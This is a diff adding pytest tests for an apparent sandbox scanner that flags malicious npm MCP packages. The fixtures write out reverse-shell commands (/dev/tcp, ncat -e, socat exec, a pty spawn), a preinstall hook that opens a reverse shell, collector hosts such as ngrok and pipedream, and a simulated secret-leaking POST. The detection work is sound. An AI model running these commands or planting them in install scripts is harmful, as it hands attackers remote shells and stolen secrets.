@@ -409,3 +409,65 @@ def test_test_certificate_is_copied_never_mounted_through_a_link(tmp_path):
     (m.ca_dir / "ca.pem").write_text(pem)
     got = m._trusted_copy()
     assert got == tmp_path / "ca-trust.pem" and got.read_text() == pem
+
+
+# ---- found by running real npm MCP malware (v0.4.1) ---------------------------------------
+def test_reverse_shell_pattern():
+    from engine import rules
+    for bad in ("sh -c sh -i >& /dev/tcp/203.0.113.7/2333 0>&1", "bash -i", "ncat 203.0.113.7 9 -e /bin/sh",
+                "socat tcp:203.0.113.7:9 exec:sh", "python -c 'import pty; pty.spawn(\"sh\")'"):
+        assert rules.reverse_shell_hits([bad]), bad
+    for fine in ("sh -c npm run build", "node index.js --interactive", "bash -c 'echo hi'", "ls /dev/null"):
+        assert not rules.reverse_shell_hits([fine]), fine
+
+
+def test_install_script_reverse_shell_is_critical():
+    raw = result(install_scripts=[{"package": "helper", "scripts": {"preinstall": "sh -i >& /dev/tcp/203.0.113.7/2333 0>&1"}}])
+    assert rules_of(raw)["reverse_shell"]["severity"] == "critical"
+    clean = result(install_scripts=[{"package": "helper", "scripts": {"postinstall": "node build.js"}}])
+    assert "reverse_shell" not in rules_of(clean)
+
+
+def test_tunnel_and_collector_hosts():
+    sink = {"tcp": [{"host": "det-0000.ngrok-free.app:443", "port": 443, "bytes": 10, "data": "GET /"}],
+            "dns": [{"name": "eo123.m.pipedream.net"}]}
+    found = rules_of(result(sink=sink))
+    assert found["collection_service"]["severity"] == "high"
+    assert len(found["collection_service"]["evidence"]) == 2
+    honest = {"tcp": [{"host": "api.github.com", "port": 443, "bytes": 10, "data": "GET /"}],
+              "dns": [{"name": "notngrok.example"}]}
+    assert "collection_service" not in rules_of(result(sink=honest))
+
+
+def test_hidden_code_is_reported():
+    assert rules_of(result(hidden_code=["helper.js (12 KB): 260 obfuscator names like _0x1a2b"]))[
+        "obfuscated_code"]["severity"] == "high"
+    assert "obfuscated_code" not in rules_of(result())
+
+
+def test_some_calls_leave_optional_fields_out(tmp_path):
+    import sys
+    sys.path.insert(0, str(mcp.Path(__file__).resolve().parents[1] / "sandbox"))
+    import mcp_harness
+
+    class H:
+        CANARY = CANARY
+    schema = {"type": "object", "required": ["to"],
+              "properties": {"to": {"type": "string", "format": "email"}, "attachmentUrl": {"type": "string"}}}
+    assert set(mcp_harness._schema_args(H, schema, str(tmp_path))) == {"to", "attachmentUrl"}
+    assert set(mcp_harness._schema_args(H, schema, str(tmp_path), required_only=True)) == {"to"}
+    assert mcp_harness._has_optional(schema)
+    assert not mcp_harness._has_optional({"type": "object", "required": ["to"], "properties": {"to": {}}})
+
+
+def test_reworded_test_input_is_not_a_leak():
+    from engine import rules
+    assert not rules._secret_hits(f'{{"query": "detonator input {CANARY.lower()} arg"}}', CANARY)
+    assert rules._secret_hits(f"sk-{CANARY}-0002", CANARY)
+
+
+def test_leak_evidence_names_the_port_once():
+    sink = {"tcp": [{"host": "203.0.113.7:4433", "port": 4433, "bytes": 90,
+                     "data": f"POST /c HTTP/1.1\r\nhost: 203.0.113.7:4433\r\n\r\nsk-{CANARY}-0002"}], "dns": []}
+    ev = rules_of(result(sink=sink))["secret_sent_out"]["evidence"][0]
+    assert "203.0.113.7:4433 " in ev and ":4433:4433" not in ev
